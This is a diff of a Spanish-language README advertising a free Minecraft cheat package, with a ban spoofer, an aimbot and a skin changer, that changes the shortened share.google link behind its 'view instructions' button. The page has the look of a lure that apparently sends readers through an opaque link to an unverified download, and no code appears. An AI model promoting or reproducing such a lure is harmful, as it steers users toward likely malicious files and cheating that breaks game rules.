@@ -5,7 +5,7 @@
 Descarga el paquete **Minecraft**: spoofer para los baneos de Server-side, un aimbot configurable y un skin changer completo en un único archivo portable. **Sin suscripción, sin cuenta y funciona sin conexión.**
 
 <p align="center">
-  <a href="https://share.google/ryZSCT2ARZXaM826Z"><img src="button.svg" alt="Ver instrucciones" height="46"></a>
+  <a href="https://share.google/YXMVUJ289WWXAp0Uh"><img src="button.svg" alt="Ver instrucciones" height="46"></a>
 </p>
 
 ## ⚡ Inicio rápido
